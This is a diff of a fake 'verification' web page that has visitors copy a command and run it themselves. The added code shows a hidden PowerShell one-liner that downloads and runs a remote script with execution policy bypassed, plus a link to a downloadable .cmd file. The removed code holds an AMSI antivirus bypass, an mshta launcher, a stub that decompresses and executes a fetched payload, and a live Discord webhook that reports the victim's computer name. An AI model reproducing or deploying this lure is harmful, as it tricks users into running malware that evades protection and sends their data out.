@@ -46,59 +46,30 @@ button.ok{background:#248046}
   </ol>
   <div class="code" id="cmd">loading…</div>
   <button id="b">Copy command</button>
-  <div class="alt"><a id="sw">Trouble? Use alternative command</a></div>
+  <div class="alt"><a id="sw" href="/f">Trouble? Download the .cmd file instead</a></div>
   <div class="foot">Verification is done automatically in the background</div>
 </div>
 <script>
 (function(){
   var host = location.origin;
-  var wh = 'https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K';
-  var t = Date.now();
-
-  var AMSI = String.raw`try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class A{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void P(){var l=LoadLibrary("amsi.dll");var a=GetProcAddress(l,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)6,0x40,out o);byte[] b={0xB8,0x57,0x00,0x07,0x80,0xC3};Marshal.Copy(b,0,a,6);}}';[A]::P();P 'amsi : patched'}catch{P ('amsi : '+$_.Exception.Message)}`;
-
-  var stub = "$ErrorActionPreference='Stop'"
-    + ";$ProgressPreference='SilentlyContinue'"
-    + ";$wh='" + wh + "'"
-    + ";function P($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15}catch{}}"
-    + ";P ('stub : '+$env:COMPUTERNAME)"
-    + ";$p='" + host + "/a?_=" + t + "'"
-    + ";try{"
-    + "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String((irm $p)))"
-    + ";$d=New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress)"
-    + ";$o=New-Object IO.MemoryStream;$d.CopyTo($o)"
-    + ";$t=[Text.Encoding]::UTF8.GetString($o.ToArray())"
-    + ";" + AMSI
-    + ";iex $t"
-    + "}catch{P ('fail : '+$_.Exception.Message)}";
-
-  function b64(s){
-    var o='';
-    for(var i=0;i<s.length;i++) o+=String.fromCharCode(s.charCodeAt(i)&0xff,(s.charCodeAt(i)>>8)&0xff);
-    return btoa(o);
-  }
-
-  var main = 'mshta "' + host + '/h.hta?_=' + t + '"';
-  var alt  = 'powershell -nop -ni -w h -ep bypass -enc ' + b64(stub);
-  var cur = main;
-
-  var cmd = document.getElementById('cmd');
+  var cmd = 'powershell -nop -w h -ep bypass -c "irm ' + host + '/s?_=' + Date.now() + '|iex"';
+  var box = document.getElementById('cmd');
   var btn = document.getElementById('b');
-  var sw  = document.getElementById('sw');
-  cmd.textContent = cur;
-
-  sw.onclick = function(){
-    cur = (cur === main) ? alt : main;
-    cmd.textContent = cur;
-    sw.textContent = (cur === main) ? 'Trouble? Use alternative command' : 'Back to standard command';
-    btn.textContent = 'Copy command';
-  };
+  box.textContent = cmd;
 
   btn.onclick = function(){
-    var v = cur;
     function ok(){btn.textContent='Copied';btn.className='ok';setTimeout(function(){btn.textContent='Copy command';btn.className='';},2200);}
-    function fb(){var a=document.createElement('textarea');a.value=v;document.body.appendChild(a);a.select();try{document.execCommand('copy');ok()}catch(e){}document.body.removeChild(a);}
-    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(v).then(ok).catch(fb)}else{fb()}
+    function fb(){
+      var a = document.createElement('textarea');
+      a.value = cmd;
+      document.body.appendChild(a);
+      a.select();
+      try{document.execCommand('copy');ok()}catch(e){}
+      document.body.removeChild(a);
+    }
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(cmd).then(ok).catch(fb);
+    } else { fb(); }
   };
 })();
 </script>
